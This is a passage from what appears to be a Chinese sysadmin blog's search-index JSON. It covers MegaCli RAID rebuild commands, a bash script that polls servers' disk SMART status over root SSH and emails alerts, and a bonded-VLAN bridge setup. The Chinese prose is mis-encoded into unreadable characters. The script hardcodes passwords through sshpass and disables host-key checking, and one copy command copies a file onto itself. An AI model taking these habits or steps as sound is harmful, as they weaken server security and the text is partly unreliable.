1\né¦–å…ˆè¿›è¡Œæ›¿æ¢ï¼Œæ–°ç›˜çš„idæ˜¯32:2ï¼Œæ›¿æ¢æ‰Array0 Row1çš„ç›˜\n/opt/MegaRAID/MegaCli/MegaCli64 -PdReplaceMissing -PhysDrv [32:2] -Array0 -row1 -a0 ç„¶åå¼ºåˆ¶è¿™å—æ–°ç›˜å¼€å§‹é‡å»º\n/opt/MegaRAID/MegaCli/MegaCli64 -PDRbld -Start -PhysDrv [32:2] -a0 éšæ—¶æŸ¥çœ‹ä¸€ä¸‹è¿›åº¦\n/opt/MegaRAID/MegaCli/MegaCli64 -PDRbld -ShowProg -PhysDrv [32:2] -a0 ä¸Šé¢å·²ç»èµ°äº†5%äº†ï¼Œèµ°å®Œå°±okäº†ã€‚\n","permalink":"https://rendoumi.com/posts/20231227-megacli_rebuild/","summary":"\u003cp\u003e192.168.85.7ä¸Šé¢æœ‰ä¸¤ä¸ªRaid\u003c/p\u003e\n\u003cp\u003eä¸€ä¸ªRaid1, 500Gï¼Œåº”è¯¥æ˜¯ä¸¤å—ç›˜ï¼Œç°åœ¨ä¸¢äº†ä¸€å—ï¼Œæ­£ç¡®çš„æ§½ä½ä¸çŸ¥é“æ˜¯å“ªä¸€ä¸ª\nå¦ä¸€ä¸ªæ˜¯Raid0ï¼Œ4TBï¼Œè¿è¡Œæ­£å¸¸\u003c/p\u003e\n\u003cp\u003eç°åœ¨åœ¨ä¸€ä¸ªæ–°æ§½ä½ä¸Šæ’äº†ä¸€å—ç¡¬ç›˜ï¼Œä½†æ˜¯æ§½ä½ä¸å¯¹ï¼Œæ²¡æœ‰è‡ªåŠ¨rebuildï¼ŒçŠ¶æ€æ˜¯unconfiged good.\u003c/p\u003e\n\u003cp\u003eé¦–å…ˆæŸ¥ä¸€ä¸‹ä¸¢å¤±çš„ç›˜\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e/opt/MegaRAID/MegaCli/MegaCli64 -Pdgetmissing -a0\r\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20231227-megacli_rebuild/2021-07-08_112751.png\"\u003e\u003c/p\u003e\n\u003cp\u003eå¾—åˆ°\u003cstrong\u003eå‚æ•°Array 0ï¼ŒRow 1\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003eé¦–å…ˆè¿›è¡Œæ›¿æ¢ï¼Œæ–°ç›˜çš„idæ˜¯32:2ï¼Œæ›¿æ¢æ‰Array0 Row1çš„ç›˜\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/opt/MegaRAID/MegaCli/MegaCli64 -PdReplaceMissing -PhysDrv \u003cspan class=\"o\"\u003e[\u003c/span\u003e32:2\u003cspan class=\"o\"\u003e]\u003c/span\u003e -Array0 -row1 -a0\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20231227-megacli_rebuild/2021-07-08_113110.png\"\u003e\u003c/p\u003e\n\u003cp\u003eç„¶åå¼ºåˆ¶è¿™å—æ–°ç›˜å¼€å§‹é‡å»º\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/opt/MegaRAID/MegaCli/MegaCli64 -PDRbld -Start -PhysDrv \u003cspan class=\"o\"\u003e[\u003c/span\u003e32:2\u003cspan class=\"o\"\u003e]\u003c/span\u003e -a0\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20231227-megacli_rebuild/2021-07-08_113250.png\"\u003e\u003c/p\u003e\n\u003cp\u003eéšæ—¶æŸ¥çœ‹ä¸€ä¸‹è¿›åº¦\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/opt/MegaRAID/MegaCli/MegaCli64 -PDRbld -ShowProg -PhysDrv \u003cspan class=\"o\"\u003e[\u003c/span\u003e32:2\u003cspan class=\"o\"\u003e]\u003c/span\u003e -a0\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20231227-megacli_rebuild/2021-07-08_113429.png\"\u003e\u003c/p\u003e\n\u003cp\u003eä¸Šé¢å·²ç»èµ°äº†5%äº†ï¼Œèµ°å®Œå°±okäº†ã€‚\u003c/p\u003e","title":"Megacliç”¨æ¥é‡å»ºä¸çŸ¥é“æ­£ç¡®æ§½ä½çš„Raid"},{"content":"é€‚ç”¨äºæ‰€æœ‰MegaCliçš„æœºå™¨ã€‚æ— è®ºdellã€æµªæ½®è¿˜æ˜¯H3Cã€‚\nå¿…é¡»æ¯å¤©ä¸Šåˆã€ä¸‹åˆå„æ£€æŸ¥ä¸€ä¸‹æ‰€æœ‰ç‰©ç†æœºçš„ç£ç›˜å•Šï¼Œæœ‰é—®é¢˜åŠæ—¶å¤„ç†ã€‚\n172.18.31.2 /usr/local/bin/check_disk.sh è„šæœ¬ï¼š\nL1åˆ°L5ï¼Œæ˜¯5ä¸ªæœºæŸœï¼Œä»ä¸Šåˆ°ä¸‹æ˜¯172.18.x.xçš„ipåˆ†å¸ƒ\n#!/bin/bash L1=(30.1 30.2 30.3 30.4 30.5 30.6 30.7 30.8 30.9 30.10 30.11 30.12 30.13 30.14 30.15 30.16 20.25 30.18) L2=(30.19 20.23 20.24 20.30 20.31 20.9 20.10 20.37 20.38 20.39 30.29 30.30 20.16 20.17 30.33 30.34 30.35 30.36) L3=(30.37 20.44 20.45 22.200 30.41 30.42 30.43 30.44 30.45 30.46 30.47 22.201 30.49 30.50 20.51 20.52 20.58 20.59) L4=(20.65 20.66 30.57 30.58 30.59 30.60 20.1 20.2 30.63 30.64 30.65 30.66 30.67 30.68 30.69 30.70 30.71 30.72) L5=(30.73 30.74 30.75 30.76) \u0026gt; /tmp/idrac.txt \u0026gt; /tmp/idracout.txt for i in L1 L2 L3 L4 L5 do var=$i[@] for j in ${!var} do echo \u0026#34;Scan $i 172.18.$j......\u0026#34; \u0026gt;\u0026gt; /tmp/idrac.txt sshpass -p \u0026#34;xxxxxxxx\u0026#34; ssh -oStrictHostKeyChecking=no root@172.18.$j /opt/MegaRAID/MegaCli/MegaCli64 -PDList -a0|grep \u0026#34;S.M.A.R.T\u0026#34; \u0026gt;\u0026gt; /tmp/idrac.txt done done lines=($(grep -n \u0026#34;Yes\u0026#34; /tmp/idrac.txt | cut -f1 -d:)) if [ ${#lines[@]} -eq 0 ]; then exit 1 else for findline in ${lines[@]} do array=($(grep -n \u0026#34;\\.\\.\\.\\.\\.\\.\u0026#34; /tmp/idrac.txt |cut -f1 -d:)) newarray=(${array[*]} ${findline}) sortarray=($(echo ${newarray[@]} | tr \u0026#39; \u0026#39; \u0026#39;\\n\u0026#39;|sort -n)) for((i=0;i\u0026lt;${#sortarray[*]};i++)) do if [ ${sortarray[$i]} -eq $findline ];then beginline=${sortarray[(($i-1))]} endline=${sortarray[(($i+1))]} if [ \u0026#34;$endline\u0026#34; == \u0026#34;\u0026#34; ];then endline=\u0026#34;$\u0026#34; else endline=$(($endline-1)) fi break fi done sed -n \u0026#34;$beginline,$endline p\u0026#34; /tmp/idrac.txt \u0026gt;\u0026gt; /tmp/idracout.txt done /usr/local/bin/mailsend -to \u0026#34;zhangranrui@ddky.com\u0026#34; -from monit@ddky.com -ssl -port 465 -auth -auth-plan -smtp smtp.exmail.qq.com -sub \u0026#34;IDCæœºå™¨ç¡¬ä»¶æ•…éšœ\u0026#34; -v -user \u0026#34;monit@ddky.com\u0026#34; -pass \u0026#34;xxxxxxxx\u0026#34; -cs \u0026#34;gb2312\u0026#34; -enc-type \u0026#34;base64\u0026#34; -M \u0026#34;$(cat /tmp/idracout.txt)\u0026#34; fi ","permalink":"https://rendoumi.com/posts/20231227-megacli_disk/","summary":"\u003cp\u003eé€‚ç”¨äºæ‰€æœ‰MegaCliçš„æœºå™¨ã€‚æ— è®ºdellã€æµªæ½®è¿˜æ˜¯H3Cã€‚\u003c/p\u003e\n\u003cp\u003eå¿…é¡»æ¯å¤©ä¸Šåˆã€ä¸‹åˆå„æ£€æŸ¥ä¸€ä¸‹æ‰€æœ‰ç‰©ç†æœºçš„ç£ç›˜å•Šï¼Œæœ‰é—®é¢˜åŠæ—¶å¤„ç†ã€‚\u003c/p\u003e\n\u003cp\u003e172.18.31.2  /usr/local/bin/check_disk.sh è„šæœ¬ï¼š\u003c/p\u003e\n\u003cp\u003eL1åˆ°L5ï¼Œæ˜¯5ä¸ªæœºæŸœï¼Œä»ä¸Šåˆ°ä¸‹æ˜¯172.18.x.xçš„ipåˆ†å¸ƒ\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#!/bin/bash\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eL1\u003c/span\u003e\u003cspan class=\"o\"\u003e=(\u003c/span\u003e30.1  30.2  30.3  30.4   30.5  30.6  30.7  30.8  30.9  30.10 30.11 30.12  30.13 30.14 30.15 30.16 20.25 30.18\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eL2\u003c/span\u003e\u003cspan class=\"o\"\u003e=(\u003c/span\u003e30.19 20.23 20.24 20.30  20.31 20.9  20.10 20.37 20.38 20.39 30.29 30.30  20.16 20.17 30.33 30.34 30.35 30.36\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eL3\u003c/span\u003e\u003cspan class=\"o\"\u003e=(\u003c/span\u003e30.37 20.44 20.45 22.200 30.41 30.42 30.43 30.44 30.45 30.46 30.47 22.201 30.49 30.50 20.51 20.52 20.58 20.59\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eL4\u003c/span\u003e\u003cspan class=\"o\"\u003e=(\u003c/span\u003e20.65 20.66 30.57 30.58  30.59 30.60 20.1  20.2  30.63 30.64 30.65 30.66  30.67 30.68 30.69 30.70 30.71 30.72\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eL5\u003c/span\u003e\u003cspan class=\"o\"\u003e=(\u003c/span\u003e30.73 30.74 30.75 30.76\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u0026gt; /tmp/idrac.txt\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u0026gt; /tmp/idracout.txt\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003efor\u003c/span\u003e i in L1 L2 L3 L4 L5\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003edo\u003c/span\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"nv\"\u003evar\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"nv\"\u003e$i\u003c/span\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e@\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"k\"\u003efor\u003c/span\u003e j in \u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"p\"\u003e!var\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"k\"\u003edo\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e   \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;Scan \u003c/span\u003e\u003cspan class=\"nv\"\u003e$i\u003c/span\u003e\u003cspan class=\"s2\"\u003e 172.18.\u003c/span\u003e\u003cspan class=\"nv\"\u003e$j\u003c/span\u003e\u003cspan class=\"s2\"\u003e......\u0026#34;\u003c/span\u003e \u0026gt;\u0026gt; /tmp/idrac.txt\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e   sshpass -p \u003cspan class=\"s2\"\u003e\u0026#34;xxxxxxxx\u0026#34;\u003c/span\u003e ssh -oStrictHostKeyChecking\u003cspan class=\"o\"\u003e=\u003c/span\u003eno root@172.18.\u003cspan class=\"nv\"\u003e$j\u003c/span\u003e /opt/MegaRAID/MegaCli/MegaCli64 -PDList -a0\u003cspan class=\"p\"\u003e|\u003c/span\u003egrep \u003cspan class=\"s2\"\u003e\u0026#34;S.M.A.R.T\u0026#34;\u003c/span\u003e \u0026gt;\u0026gt; /tmp/idrac.txt\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"k\"\u003edone\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003edone\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003elines\u003c/span\u003e\u003cspan class=\"o\"\u003e=(\u003c/span\u003e\u003cspan class=\"k\"\u003e$(\u003c/span\u003egrep -n \u003cspan class=\"s2\"\u003e\u0026#34;Yes\u0026#34;\u003c/span\u003e  /tmp/idrac.txt \u003cspan class=\"p\"\u003e|\u003c/span\u003e cut -f1 -d:\u003cspan class=\"k\"\u003e)\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e[\u003c/span\u003e \u003cspan class=\"si\"\u003e${#\u003c/span\u003e\u003cspan class=\"nv\"\u003elines\u003c/span\u003e\u003cspan class=\"p\"\u003e[@]\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e -eq \u003cspan class=\"m\"\u003e0\u003c/span\u003e \u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"k\"\u003ethen\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"nb\"\u003eexit\u003c/span\u003e \u003cspan class=\"m\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003eelse\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"k\"\u003efor\u003c/span\u003e findline in \u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003elines\u003c/span\u003e\u003cspan class=\"p\"\u003e[@]\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"k\"\u003edo\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003earray\u003c/span\u003e\u003cspan class=\"o\"\u003e=(\u003c/span\u003e\u003cspan class=\"k\"\u003e$(\u003c/span\u003egrep -n \u003cspan class=\"s2\"\u003e\u0026#34;\\.\\.\\.\\.\\.\\.\u0026#34;\u003c/span\u003e  /tmp/idrac.txt \u003cspan class=\"p\"\u003e|\u003c/span\u003ecut -f1 -d:\u003cspan class=\"k\"\u003e)\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003enewarray\u003c/span\u003e\u003cspan class=\"o\"\u003e=(\u003c/span\u003e\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003earray\u003c/span\u003e\u003cspan class=\"p\"\u003e[*]\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e \u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003efindline\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003esortarray\u003c/span\u003e\u003cspan class=\"o\"\u003e=(\u003c/span\u003e\u003cspan class=\"k\"\u003e$(\u003c/span\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003enewarray\u003c/span\u003e\u003cspan class=\"p\"\u003e[@]\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e tr \u003cspan class=\"s1\"\u003e\u0026#39; \u0026#39;\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;\\n\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003esort -n\u003cspan class=\"k\"\u003e)\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003efor\u003c/span\u003e\u003cspan class=\"o\"\u003e((\u003c/span\u003e\u003cspan class=\"nv\"\u003ei\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e0\u003cspan class=\"p\"\u003e;\u003c/span\u003ei\u0026lt;\u003cspan class=\"si\"\u003e${#\u003c/span\u003e\u003cspan class=\"nv\"\u003esortarray\u003c/span\u003e\u003cspan class=\"p\"\u003e[*]\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003ei++\u003cspan class=\"o\"\u003e))\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003edo\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e[\u003c/span\u003e \u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003esortarray\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nv\"\u003e$i\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e -eq \u003cspan class=\"nv\"\u003e$findline\u003c/span\u003e \u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\u003cspan class=\"k\"\u003ethen\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nv\"\u003ebeginline\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003esortarray\u003c/span\u003e\u003cspan class=\"p\"\u003e[((\u003c/span\u003e\u003cspan class=\"nv\"\u003e$i\u003c/span\u003e\u003cspan class=\"p\"\u003e-1))]\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nv\"\u003eendline\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003esortarray\u003c/span\u003e\u003cspan class=\"p\"\u003e[((\u003c/span\u003e\u003cspan class=\"nv\"\u003e$i\u003c/span\u003e\u003cspan class=\"p\"\u003e+1))]\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e[\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"nv\"\u003e$endline\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e \u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\u003cspan class=\"k\"\u003ethen\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          \u003cspan class=\"nv\"\u003eendline\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e$\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"k\"\u003eelse\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          \u003cspan class=\"nv\"\u003eendline\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"k\"\u003e$((\u003c/span\u003e\u003cspan class=\"nv\"\u003e$endline\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e\u003cspan class=\"k\"\u003e))\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"k\"\u003efi\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nb\"\u003ebreak\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"k\"\u003efi\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003edone\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    sed -n \u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"nv\"\u003e$beginline\u003c/span\u003e\u003cspan class=\"s2\"\u003e,\u003c/span\u003e\u003cspan class=\"nv\"\u003e$endline\u003c/span\u003e\u003cspan class=\"s2\"\u003e p\u0026#34;\u003c/span\u003e /tmp/idrac.txt \u0026gt;\u0026gt; /tmp/idracout.txt \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"k\"\u003edone\u003c/span\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  /usr/local/bin/mailsend -to \u003cspan class=\"s2\"\u003e\u0026#34;zhangranrui@ddky.com\u0026#34;\u003c/span\u003e -from monit@ddky.com -ssl -port \u003cspan class=\"m\"\u003e465\u003c/span\u003e -auth -auth-plan -smtp smtp.exmail.qq.com -sub \u003cspan class=\"s2\"\u003e\u0026#34;IDCæœºå™¨ç¡¬ä»¶æ•…éšœ\u0026#34;\u003c/span\u003e -v -user \u003cspan class=\"s2\"\u003e\u0026#34;monit@ddky.com\u0026#34;\u003c/span\u003e -pass \u003cspan class=\"s2\"\u003e\u0026#34;xxxxxxxx\u0026#34;\u003c/span\u003e -cs \u003cspan class=\"s2\"\u003e\u0026#34;gb2312\u0026#34;\u003c/span\u003e -enc-type \u003cspan class=\"s2\"\u003e\u0026#34;base64\u0026#34;\u003c/span\u003e -M \u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"k\"\u003e$(\u003c/span\u003ecat /tmp/idracout.txt\u003cspan class=\"k\"\u003e)\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003efi\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","title":"Linuxä¸‹å®šæœŸæ£€æŸ¥ç‰©ç†æœºç£ç›˜çš„è„šæœ¬"},{"content":"æˆ‘ä»¬çš„å®¿ä¸»æœºä¸Šåšäº†4ç½‘å¡bondingï¼Œç„¶åéœ€è¦ä¸Šå‡åˆ°brï¼Œä¸¤ä¸ªç½‘å¡éƒ½éœ€è¦åšä¸Švlanã€‚\næ¯”å¦‚172.18.30.1ï¼Œæƒ³åœ¨ä¸Šé¢å¢åŠ ä¸€ä¸ªVLANæ®µ202ï¼Œç„¶ååœ¨ä¸Šé¢ç”Ÿäº§ä¸€å°è™šæœº172.18.19.2\nå°±éœ€è¦å¢åŠ ä¸€ä¸ªbond0.202ä»¥åŠbr0.202\nåšæ³•å¦‚ä¸‹:\ncd /etc/sysconfig/network-scripts cp ifcfg-bond0.199 ifcfg-bond0.202 vi ifcfg-bond0.202 DEVICE=bond0.202 ONBOOT=yes USERCTL=no BRIDGE=br0.202 VLAN=yes cp ifcfg-br0.199 ifcfg-br0.199 vi ifcfg-br0.202 DEVICE=br0.202 BOOTPROTO=static ONBOOT=yes TYPE=Bridge ç„¶åå¯åŠ¨è¿™ä¸¤ä¸ªç½‘å¡ï¼Œå¯åŠ¨é¡ºåºå¾ˆé‡è¦ï¼ï¼ï¼\nifup bond0.202 ifup br0.202 æ³¨æ„ï¼Œæ‰§è¡Œå®Œä»¥ååŠ¡å¿…æ£€æŸ¥ä¸€ä¸‹ä¸¤ä¸ªç½‘å¡æ˜¯å¦UP\nç„¶åäº§è™šæœºå°±å¥½\n./vm.sh create -b br0.202 -c 4 -m 4096 -d 40 -i 172.18.19.2 -k 255.255.255.0 -g 172.18.19.254 -q 172.18.30.1 -r 172.18.30.2 ucarp-18-19-2 ","permalink":"https://rendoumi.com/posts/20231227-vlan_bond_br/","summary":"\u003cp\u003eæˆ‘ä»¬çš„å®¿ä¸»æœºä¸Šåšäº†4ç½‘å¡bondingï¼Œç„¶åéœ€è¦ä¸Šå‡åˆ°brï¼Œä¸¤ä¸ªç½‘å¡éƒ½éœ€è¦åšä¸Švlanã€‚\u003c/p\u003e\n\u003cp\u003eæ¯”å¦‚172.18.30.1ï¼Œæƒ³åœ¨ä¸Šé¢å¢åŠ 